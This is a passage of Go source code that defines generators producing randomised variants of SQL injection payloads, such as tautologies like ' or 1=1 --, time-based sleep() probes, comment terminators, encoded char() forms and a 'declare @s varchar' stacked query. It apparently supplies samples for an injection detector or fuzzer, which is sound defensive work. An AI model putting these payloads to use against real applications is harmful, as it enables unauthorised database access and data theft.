				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "and"
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				return
			},
		},
		{
			Form: " or a=a--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				name := sampleName()
				sample += name
				sample += "="
				sample += name
				sample += "--"
				return
			},
		},
		{
			Form: " or '1'='1",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += "'"
				number := sampleNumber(1337)
				sample += "'='"
				sample += number
				return
			},
		},
		{
			Form: "|",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "|"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: " or sleep(__TIME__)='",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")='"
				return
			},
		},
		{
			Form: " or 1 --'",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "--'"
				return
			},
		},
		{
			Form: "or 0=0 #\"",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "#\""
				return
			},
		},
		{
			Form: "having",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "having"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "a'",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				return
			},
		},
		{
			Form: "\" or isNULL(1/0) /*",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "isnull("
				sample += sampleNumber(1337)
				sample += ")"
				sample += sampleSpaces()
				sample += "/*"
				return
			},
		},
		{
			Form: "declare @s varchar (8000) select @s = 0x73656c ...",
			Make: func() (sample string) {
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "varchar"
				sample += sampleSpaces()
				sample += "("
				sample += sampleNumber(8000)
				sample += ")"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: "â or 1=1 --",
			Make: func() (sample string) {
				sample += sampleName()
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: "char%4039%41%2b%40SELECT",
			Make: func() (sample string) {
				sample += "char%40"
				sample += sampleNumber(256)
				sample += "%41%2b%40select"
				return
			},
		},
		{
			Form: "order by",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "order"
				sample += sampleSpaces()
				sample += "by"
				sample += sampleSpaces()
				return
			},
		},
	}
	return generators
}
